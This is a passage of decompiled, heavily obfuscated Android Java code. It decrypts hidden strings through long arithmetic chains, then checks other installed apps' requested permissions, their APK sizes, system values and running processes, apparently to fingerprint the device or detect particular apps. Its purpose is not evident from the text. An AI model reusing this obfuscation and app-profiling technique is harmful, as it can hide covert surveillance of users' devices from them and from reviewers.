                    long j1024 = ((((j1023 >>> 4) | j1023) & 16711935) << 16) + ((((j1020 >>> 4) | j1020) & 16711935) << 24);
                    long j1025 = (j1017 >>> 16) & 43690;
                    long j1026 = ((j1025 >>> 2) | (j1025 >>> 1)) & 858993459;
                    long j1027 = ((j1026 >>> 2) | j1026) & 252645135;
                    long j1028 = j1017 & 43690;
                    long j1029 = ((j1028 >>> 2) | (j1028 >>> 1)) & 858993459;
                    long j1030 = ((j1029 >>> 2) | j1029) & 252645135;
                    int a5 = V2.a(((int) ((((j1030 >>> 4) | j1030) & 16711935) + (((((j1027 >>> 4) | j1027) & 16711935) << 8) | j1024))) | 33989, ~i30, ((~r10) - i30) - 1);
                    long j1031 = 287622857;
                    long j1032 = a5;
                    long j1033 = ((((((((j1031 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j1031 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j1031 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j1031 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j1032 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j1032 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j1032 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j1032 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j1034 = (j1033 >>> 48) & 21845;
                    long j1035 = ((j1034 >>> 1) | j1034) & 858993459;
                    long j1036 = ((j1035 >>> 2) | j1035) & 252645135;
                    long j1037 = (j1033 >>> 32) & 21845;
                    long j1038 = ((j1037 >>> 1) | j1037) & 858993459;
                    long j1039 = ((j1038 >>> 2) | j1038) & 252645135;
                    long j1040 = ((((j1039 >>> 4) | j1039) & 16711935) << 16) + ((((j1036 >>> 4) | j1036) & 16711935) << 24);
                    long j1041 = (j1033 >>> 16) & 21845;
                    long j1042 = ((j1041 >>> 1) | j1041) & 858993459;
                    long j1043 = ((j1042 >>> 2) | j1042) & 252645135;
                    long j1044 = j1033 & 21845;
                    long j1045 = ((j1044 >>> 1) | j1044) & 858993459;
                    long j1046 = ((j1045 >>> 2) | j1045) & 252645135;
                    x(bArr19, new byte[]{51, 34, 126, 17, -69, -104, -60, 48, 76, -17, 92, 122, 85, 66, 115, 35, 71, -82, -27, 97, 9, 89, 104, -59, -74, -48, 75, -69, -21, -93, -48, 18, 39, 40, (int) ((((j1046 >>> 4) | j1046) & 16711935) + (((((j1043 >>> 4) | j1043) & 16711935) << 8) | j1040)), -125, 58, 58, -111, 119, -124, 12});
                    HashSet hashSet3 = new HashSet(Arrays.asList(intern, intern4, intern8, intern5, intern7, intern6, new String(bArr19, charset).intern(), intern3));
                    HashSet hashSet4 = new HashSet(Arrays.asList(packageInfo.requestedPermissions));
                    boolean containsAll = hashSet4.containsAll(hashSet);
                    boolean containsAll2 = hashSet4.containsAll(hashSet2);
                    boolean containsAll3 = hashSet4.containsAll(hashSet3);
                    if (containsAll || containsAll2 || containsAll3) {
                        long length = new File(applicationInfo.sourceDir).length() / 1024;
                        if ((length >= 20 && length <= 40) || (length >= 9216 && length <= 20480)) {
                            String valueOf = containsAll ? String.valueOf(1) : containsAll2 ? String.valueOf(2) : String.valueOf(3);
                            byte[] bArr20 = {44, 82, 83, 70, 99, -102, -66, 21, -36, -36, -55, -113, -41, -69, -28, 84, 64};
                            long j1047 = 17975496;
                            long j1048 = (((((((((j1047 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j1047 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((j1047 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j1047 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16)))) + j82 + 6148914691236517205L;
                            long j1049 = (j1048 >>> 48) & 43690;
                            long j1050 = ((j1049 >>> 2) | (j1049 >>> 1)) & 858993459;
                            long j1051 = (j1050 | (j1050 >>> 2)) & 252645135;
                            long j1052 = (j1048 >>> 32) & 43690;
                            long j1053 = ((j1052 >>> 2) | (j1052 >>> 1)) & 858993459;
                            long j1054 = ((j1053 >>> 2) | j1053) & 252645135;
                            long j1055 = ((((j1054 >>> 4) | j1054) & 16711935) << 16) + (((j1051 | (j1051 >>> 4)) & 16711935) << 24);
                            long j1056 = (j1048 >>> 16) & 43690;
                            long j1057 = ((j1056 >>> 2) | (j1056 >>> 1)) & 858993459;
                            long j1058 = ((j1057 >>> 2) | j1057) & 252645135;
                            long j1059 = j1048 & 43690;
                            long j1060 = ((j1059 >>> 2) | (j1059 >>> 1)) & 858993459;
                            long j1061 = (j1060 | (j1060 >>> 2)) & 252645135;
                            x(bArr20, new byte[]{68, 51, 32, 11, 2, -3, -41, 102, -73, -113, -67, -6, -75, -14, 1322029414 ^ ((-1340004828) + ((int) (((j1061 | (j1061 >>> 4)) & 16711935) | (((((j1058 >>> 4) | j1058) & 16711935) << 8) | j1055)))), 50, 47});
                            t(new String(bArr20, charset).intern(), valueOf);
                            long j1062 = j521 + j25;
                            long j1063 = (j1062 >>> 48) & 21845;
                            long j1064 = (j1063 | (j1063 >>> 1)) & 858993459;
                            long j1065 = (j1064 | (j1064 >>> 2)) & 252645135;
                            long j1066 = (j1062 >>> 32) & 21845;
                            long j1067 = (j1066 | (j1066 >>> 1)) & 858993459;
                            long j1068 = (j1067 | (j1067 >>> 2)) & 252645135;
                            long j1069 = (((j1068 | (j1068 >>> 4)) & 16711935) << 16) + (((j1065 | (j1065 >>> 4)) & 16711935) << 24);
                            long j1070 = (j1062 >>> 16) & 21845;
                            long j1071 = (j1070 | (j1070 >>> 1)) & 858993459;
                            long j1072 = (j1071 | (j1071 >>> 2)) & 252645135;
                            long j1073 = j1062 & 21845;
                            long j1074 = (j1073 | (j1073 >>> 1)) & 858993459;
                            long j1075 = (j1074 | (j1074 >>> 2)) & 252645135;
                            long j1076 = 1901594644;
                            long j1077 = ((((((((j1076 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((j1076 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j1076 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j1076 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32)) + j521;
                            long j1078 = (j1077 >>> 48) & 43690;
                            long j1079 = ((j1078 >>> 2) | (j1078 >>> 1)) & 858993459;
                            long j1080 = (j1079 | (j1079 >>> 2)) & 252645135;
                            long j1081 = (j1077 >>> 32) & 43690;
                            long j1082 = ((j1081 >>> 2) | (j1081 >>> 1)) & 858993459;
                            long j1083 = (j1082 | (j1082 >>> 2)) & 252645135;
                            long j1084 = (((j1080 | (j1080 >>> 4)) & 16711935) << 24) | (((j1083 | (j1083 >>> 4)) & 16711935) << 16);
                            long j1085 = (j1077 >>> 16) & 43690;
                            long j1086 = ((j1085 >>> 2) | (j1085 >>> 1)) & 858993459;
                            long j1087 = (j1086 | (j1086 >>> 2)) & 252645135;
                            long j1088 = j1077 & 43690;
                            long j1089 = ((j1088 >>> 2) | (j1088 >>> 1)) & 858993459;
                            long j1090 = (j1089 | (j1089 >>> 2)) & 252645135;
                            byte[] bArr21 = {-76, 70, -62, 19, 78, -28, 116, -46, -24, -36, 123, 22, (((((int) (((j1075 | (j1075 >>> 4)) & 16711935) + ((((j1072 | (j1072 >>> 4)) & 16711935) << 8) | j1069))) | (-1901595165)) & 1377708214) + (((int) (((j1090 | (j1090 >>> 4)) & 16711935) + (j1084 | (((j1087 | (j1087 >>> 4)) & 16711935) << 8)))) | (-1455422968))) ^ 77714759};
                            long j1091 = -57697809;
                            long j1092 = (((((((((j1091 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j1091 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j1091 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j1091 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j25 + 6148914691236517205L;
                            long j1093 = (j1092 >>> 48) & 43690;
                            long j1094 = ((j1093 >>> 2) | (j1093 >>> 1)) & 858993459;
                            long j1095 = (j1094 | (j1094 >>> 2)) & 252645135;
                            long j1096 = (j1092 >>> 32) & 43690;
                            long j1097 = ((j1096 >>> 2) | (j1096 >>> 1)) & 858993459;
                            long j1098 = (j1097 | (j1097 >>> 2)) & 252645135;
                            long j1099 = (((j1098 | (j1098 >>> 4)) & 16711935) << 16) + (((j1095 | (j1095 >>> 4)) & 16711935) << 24);
                            long j1100 = (j1092 >>> 16) & 43690;
                            long j1101 = ((j1100 >>> 2) | (j1100 >>> 1)) & 858993459;
                            long j1102 = (j1101 | (j1101 >>> 2)) & 252645135;
                            long j1103 = j1092 & 43690;
                            long j1104 = ((j1103 >>> 2) | (j1103 >>> 1)) & 858993459;
                            long j1105 = (j1104 | (j1104 >>> 2)) & 252645135;
                            byte b15 = ((((int) (((j1105 | (j1105 >>> 4)) & 16711935) + ((((j1102 | (j1102 >>> 4)) & 16711935) << 8) | j1099))) & (-1877206840)) + 589357090) ^ 1287849782;
                            long j1106 = 537158562;
                            long j1107 = (((((((((j1106 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j1106 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j1106 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j1106 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j59;
                            long j1108 = (j1107 >>> 48) & 43690;
                            long j1109 = ((j1108 >>> 2) | (j1108 >>> 1)) & 858993459;
                            long j1110 = (j1109 | (j1109 >>> 2)) & 252645135;
                            long j1111 = (j1107 >>> 32) & 43690;
                            long j1112 = ((j1111 >>> 2) | (j1111 >>> 1)) & 858993459;
                            long j1113 = (j1112 | (j1112 >>> 2)) & 252645135;
                            long j1114 = (((j1110 | (j1110 >>> 4)) & 16711935) << 24) | (((j1113 | (j1113 >>> 4)) & 16711935) << 16);
                            long j1115 = (j1107 >>> 16) & 43690;
                            long j1116 = ((j1115 >>> 2) | (j1115 >>> 1)) & 858993459;
                            long j1117 = (j1116 | (j1116 >>> 2)) & 252645135;
                            long j1118 = j1107 & 43690;
                            long j1119 = ((j1118 >>> 2) | (j1118 >>> 1)) & 858993459;
                            long j1120 = (j1119 | (j1119 >>> 2)) & 252645135;
                            x(bArr21, new byte[]{b15, (((int) (((j1120 | (j1120 >>> 4)) & 16711935) + (j1114 | (((j1117 | (j1117 >>> 4)) & 16711935) << 8)))) + 1347027968) ^ 1884186501, -79, 94, 47, -125, 29, -95, -125, -113, 15, 99, -101});
                            String intern9 = new String(bArr21, charset).intern();
                            byte[] bArr22 = {-67, 82, 65, -18};
                            x(bArr22, new byte[]{-55, 32, 52, -117, 3, -82, 111, -93});
                            t(intern9, new String(bArr22, charset).intern());
                            return true;
                        }
                    }
                } catch (Exception unused2) {
                    return false;
                }
            } catch (Exception unused3) {
            }
            return false;
        }
        return z3;
    }

    /*  JADX ERROR: JadxRuntimeException in pass: ReplaceNewArray
        jadx.core.utils.exceptions.JadxRuntimeException: Can't change immutable type int to boolean for r1v4 ??
        	at jadx.core.dex.instructions.args.SSAVar.setType(SSAVar.java:115)
        	at jadx.core.dex.instructions.args.RegisterArg.setType(RegisterArg.java:52)
        	at jadx.core.dex.instructions.args.InsnArg.wrapInstruction(InsnArg.java:137)
        	at jadx.core.dex.visitors.shrink.CodeShrinkVisitor.inline(CodeShrinkVisitor.java:213)
        	at jadx.core.dex.visitors.shrink.CodeShrinkVisitor.shrinkBlock(CodeShrinkVisitor.java:73)
        	at jadx.core.dex.visitors.shrink.CodeShrinkVisitor.shrinkMethod(CodeShrinkVisitor.java:48)
        	at jadx.core.dex.visitors.ReplaceNewArray.visit(ReplaceNewArray.java:55)
        */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r13v66, types: [java.lang.Object, java.lang.String[]] */
    /* JADX WARN: Type inference failed for: r1v0 */
    /* JADX WARN: Type inference failed for: r1v1, types: [int, boolean] */
    /* JADX WARN: Type inference failed for: r1v13 */
    /* JADX WARN: Type inference failed for: r1v16 */
    /* JADX WARN: Type inference failed for: r1v18 */
    /* JADX WARN: Type inference failed for: r1v19 */
    /* JADX WARN: Type inference failed for: r1v21 */
    /* JADX WARN: Type inference failed for: r1v27, types: [int] */
    /* JADX WARN: Type inference failed for: r1v28 */
    /* JADX WARN: Type inference failed for: r1v29 */
    /* JADX WARN: Type inference failed for: r1v30 */
    /* JADX WARN: Type inference failed for: r1v31 */
    /* JADX WARN: Type inference failed for: r1v33 */
    /* JADX WARN: Type inference failed for: r1v34 */
    /* JADX WARN: Type inference failed for: r1v35 */
    /* JADX WARN: Type inference failed for: r1v4, types: [int] */
    /* JADX WARN: Type inference failed for: r1v7 */
    /* JADX WARN: Type inference failed for: r3v12, types: [java.lang.String[]] */
    /* JADX WARN: Type inference failed for: r3v33, types: [int] */
    public final boolean E(android.content.Context r58) {
        /*
            Method dump skipped, instructions count: 2162
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: F0.C0017c0.E(android.content.Context):boolean");
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r5v0 */
    /* JADX WARN: Type inference failed for: r5v1 */
    /* JADX WARN: Type inference failed for: r5v5 */
    public final boolean F() {
        int i;
        char c4;
        int i3;
        char c5;
        int i4;
        boolean z3 = 0;
        char c6 = 2;
        int i5 = 3;
        char c7 = 5;
        long j2 = 704823360;
        long j3 = 0;
        long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
        long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
        long j6 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
        long j7 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
        long j8 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j7 + j6 + j5 + j4;
        long j9 = (j8 >>> 48) & 43690;
        long j10 = ((j9 >>> 2) | (j9 >>> 1)) & 858993459;
        long j11 = ((j10 >>> 2) | j10) & 252645135;
        long j12 = (j8 >>> 32) & 43690;
        long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
        long j14 = ((j13 >>> 2) | j13) & 252645135;
        long j15 = ((((j14 >>> 4) | j14) & 16711935) << 16) + ((((j11 >>> 4) | j11) & 16711935) << 24);
        long j16 = (j8 >>> 16) & 43690;
        long j17 = ((j16 >>> 2) | (j16 >>> 1)) & 858993459;
        long j18 = ((j17 >>> 2) | j17) & 252645135;
        long j19 = j8 & 43690;
        long j20 = ((j19 >>> 2) | (j19 >>> 1)) & 858993459;
        long j21 = ((j20 >>> 2) | j20) & 252645135;
        byte[] bArr = {33, -47, -58, 29, -113, -19, -124, 114, -33, 88, (-780326214) ^ (746586420 + (((int) ((((j21 >>> 4) | j21) & 16711935) + (((((j18 >>> 4) | j18) & 16711935) << 8) + j15))) | 33739840)), -90, -107, 28, -98, 9, -41, -50, -24, 45, 20, 47};
        long j22 = 550866944;
        int i6 = 6;
        long j23 = -1;
        long j24 = (((((((((j22 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j22 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j22 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j22 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j23 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j23 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j23 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j23 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
        long j25 = (j24 >>> 48) & 43690;
        long j26 = ((j25 >>> 2) | (j25 >>> 1)) & 858993459;
        long j27 = ((j26 >>> 2) | j26) & 252645135;
        long j28 = (j24 >>> 32) & 43690;
        long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
        long j30 = ((j29 >>> 2) | j29) & 252645135;
        long j31 = ((((j30 >>> 4) | j30) & 16711935) << 16) | ((((j27 >>> 4) | j27) & 16711935) << 24);
        long j32 = (j24 >>> 16) & 43690;
        long j33 = ((j32 >>> 2) | (j32 >>> 1)) & 858993459;
        long j34 = ((j33 >>> 2) | j33) & 252645135;
        long j35 = j24 & 43690;
        long j36 = ((j35 >>> 2) | (j35 >>> 1)) & 858993459;
        long j37 = ((j36 >>> 2) | j36) & 252645135;
        int i7 = (((int) ((((j37 >>> 4) | j37) & 16711935) | ((((j34 >>> 4) | j34) & 16711935) << 8) | j31)) & 80318542) + 1241515041;
        x(bArr, new byte[]{72, -94, -108, 104, -31, -125, -19, 28, -72, 11, -69, -10, -25, (((~i7) & 1321833500) - (1321833500 & i7)) + i7, -3, 108, -92, -67, -115, 94, 68, 124});
        Charset charset = StandardCharsets.UTF_8;
        String intern = new String(bArr, charset).intern();
        byte[] bArr2 = new byte[2];
        bArr2[B0.a(-1, 0)] = -7;
        bArr2[1] = 58;
        x(bArr2, new byte[]{-119, 73, 30, -30, 74, -79, 61, -57});
        String intern2 = new String(bArr2, charset).intern();
        byte[] bArr3 = {-48, 58, 20, 100, 74};
        long j38 = -1;
        long j39 = ((((((((j38 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j38 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
        long j40 = (((((((j38 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
        long j41 = (((((((j38 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
        long b4 = j41 + (j40 | j39) + c3.b(j5, j4, j6, j7);
        long j42 = (b4 >>> 48) & 21845;
        long j43 = ((j42 >>> 1) | j42) & 858993459;
        long j44 = ((j43 >>> 2) | j43) & 252645135;
        long j45 = (b4 >>> 32) & 21845;
        long j46 = ((j45 >>> 1) | j45) & 858993459;
        long j47 = ((j46 >>> 2) | j46) & 252645135;
        long j48 = ((((j47 >>> 4) | j47) & 16711935) << 16) + ((((j44 >>> 4) | j44) & 16711935) << 24);
        long j49 = (b4 >>> 16) & 21845;
        long j50 = ((j49 >>> 1) | j49) & 858993459;
        long j51 = ((j50 >>> 2) | j50) & 252645135;
        long j52 = ((((j51 >>> 4) | j51) & 16711935) << 8) + j48;
        long j53 = b4 & 21845;
        long j54 = ((j53 >>> 1) | j53) & 858993459;
        long j55 = ((j54 >>> 2) | j54) & 252645135;
        int i8 = ((((int) ((((j55 >>> 4) | j55) & 16711935) + j52)) | (-209605790)) & 262275167) + 1075333248;
        byte[] bArr4 = new byte[(((~i8) & 1337608407) - (1337608407 & i8)) + i8];
        bArr4[0] = -96;
        bArr4[1] = 73;
        bArr4[2] = 52;
        bArr4[3] = 73;
        bArr4[4] = 11;
        bArr4[5] = 21;
        bArr4[6] = -119;
        bArr4[7] = 117;
        x(bArr3, bArr4);
        String intern3 = new String(bArr3, charset).intern();
        byte[] bArr5 = {-42, 5, 83, -84, -53};
        long b5 = c3.b(j40, j39, j41, j7 + (j6 | j5 | j4));
        long j56 = (b5 >>> 48) & 21845;
        long j57 = ((j56 >>> 1) | j56) & 858993459;
        long j58 = ((j57 >>> 2) | j57) & 252645135;
        long j59 = (b5 >>> 32) & 21845;
        long j60 = ((j59 >>> 1) | j59) & 858993459;
        long j61 = ((j60 >>> 2) | j60) & 252645135;
        long j62 = ((((j61 >>> 4) | j61) & 16711935) << 16) + ((((j58 >>> 4) | j58) & 16711935) << 24);
        long j63 = (b5 >>> 16) & 21845;
        long j64 = ((j63 >>> 1) | j63) & 858993459;
        long j65 = ((j64 >>> 2) | j64) & 252645135;
        long j66 = b5 & 21845;
        long j67 = ((j66 >>> 1) | j66) & 858993459;
        long j68 = ((j67 >>> 2) | j67) & 252645135;
        x(bArr5, new byte[]{(((((int) ((((j68 >>> 4) | j68) & 16711935) | (((((j65 >>> 4) | j65) & 16711935) << 8) | j62))) | (-568827947)) & (-787085759)) + 579340572) ^ 207745275, 118, 115, -127, -82, -105, 13, -9});
        String[] strArr = {intern2, intern3, new String(bArr5, charset).intern()};
        int i9 = 0;
        while (i9 < i5) {
            String str = strArr[i9];
            String d2 = E1.d(str);
            if (d2 == null) {
                c4 = c7;
                i3 = z3;
                c5 = c6;
                i4 = i5;
                i = i6;
            } else {
                String[] strArr2 = V.f395f;
                int length = strArr2.length;
                for (int i10 = z3; i10 < length; i10++) {
                    if (d2.contains(strArr2[i10])) {
                        t(intern, str);
                        return true;
                    }
                }
                i = i6;
                byte[] bArr6 = new byte[i];
                bArr6[z3] = 46;
                c4 = c7;
                i3 = z3;
                long j69 = -170984875;
                c5 = c6;
                i4 = i5;
                long j70 = -1;
                long b6 = c3.b((((((((j69 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j69 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j69 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j69 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), ((((((((j70 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j70 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j70 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j70 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
                long j71 = (b6 >>> 48) & 43690;
                long j72 = ((j71 >>> c5) | (j71 >>> 1)) & 858993459;
                long j73 = ((j72 >>> c5) | j72) & 252645135;
                long j74 = (b6 >>> 32) & 43690;
                long j75 = ((j74 >>> c5) | (j74 >>> 1)) & 858993459;
                long j76 = ((j75 >>> c5) | j75) & 252645135;
                long j77 = ((((j76 >>> 4) | j76) & 16711935) << 16) + ((((j73 >>> 4) | j73) & 16711935) << 24);
                long j78 = (b6 >>> 16) & 43690;
                long j79 = ((j78 >>> c5) | (j78 >>> 1)) & 858993459;
                long j80 = ((j79 >>> c5) | j79) & 252645135;
                long j81 = b6 & 43690;
                long j82 = ((j81 >>> c5) | (j81 >>> 1)) & 858993459;
                long j83 = ((j82 >>> c5) | j82) & 252645135;
                bArr6[((((int) ((((j83 >>> 4) | j83) & 16711935) | (((((j80 >>> 4) | j80) & 16711935) << 8) + j77))) & 805446724) - 2135947256) ^ (-1330500531)] = 21;
                bArr6[c5] = -94;
                bArr6[i4] = -123;
                bArr6[4] = -79;
                bArr6[c4] = 71;
                x(bArr6, new byte[]{67, 116, -59, -20, -62, 44, 41, -25});
                if (d2.contains(new String(bArr6, StandardCharsets.UTF_8).intern())) {
                    t(intern, str);
                    return true;
                }
            }
            i9++;
            i6 = i;
            c6 = c5;
            z3 = i3;
            c7 = c4;
            i5 = i4;
        }
        return z3;
    }

    public final boolean G(Context context) {
        List<ActivityManager.RunningAppProcessInfo> runningAppProcesses;
        String intern;
        byte b4 = 35;
        byte[] bArr = new byte[35];
        bArr[0] = 30;
        bArr[1] = -85;
        bArr[2] = -33;
        bArr[3] = 103;
        bArr[4] = 46;
        bArr[5] = 103;
        bArr[6] = 1;
        bArr[7] = 30;
        bArr[8] = -29;
        long j2 = 1814605737;
        long j3 = -1;
        long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
        long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
        long j6 = j5 + j4;
        long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
        long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
        long j9 = j8 + j7 + j6;
        long j10 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j9 + 6148914691236517205L;
        long j11 = (j10 >>> 48) & 43690;
        long j12 = ((j11 >>> 2) | (j11 >>> 1)) & 858993459;
        long j13 = ((j12 >>> 2) | j12) & 252645135;
        long j14 = (j10 >>> 32) & 43690;
        long j15 = ((j14 >>> 2) | (j14 >>> 1)) & 858993459;
        long j16 = ((j15 >>> 2) | j15) & 252645135;
        long j17 = ((((j16 >>> 4) | j16) & 16711935) << 16) + ((((j13 >>> 4) | j13) & 16711935) << 24);
        long j18 = (j10 >>> 16) & 43690;
        long j19 = ((j18 >>> 2) | (j18 >>> 1)) & 858993459;
        long j20 = ((j19 >>> 2) | j19) & 252645135;
        long j21 = j10 & 43690;
        long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
        long j23 = ((j22 >>> 2) | j22) & 252645135;
        int i = 6;
        long j24 = -1827088290;
        long j25 = (((int) ((((j23 >>> 4) | j23) & 16711935) + (((((j20 >>> 4) | j20) & 16711935) << 8) | j17))) & 683934616) + 1143153664;
        long j26 = ((((((((j24 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j24 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j24 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j24 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j25 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j25 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j25 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j25 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
        long j27 = (j26 >>> 48) & 21845;
        long j28 = ((j27 >>> 1) | j27) & 858993459;
        long j29 = ((j28 >>> 2) | j28) & 252645135;
        long j30 = (j26 >>> 32) & 21845;
        long j31 = ((j30 >>> 1) | j30) & 858993459;
        long j32 = ((j31 >>> 2) | j31) & 252645135;
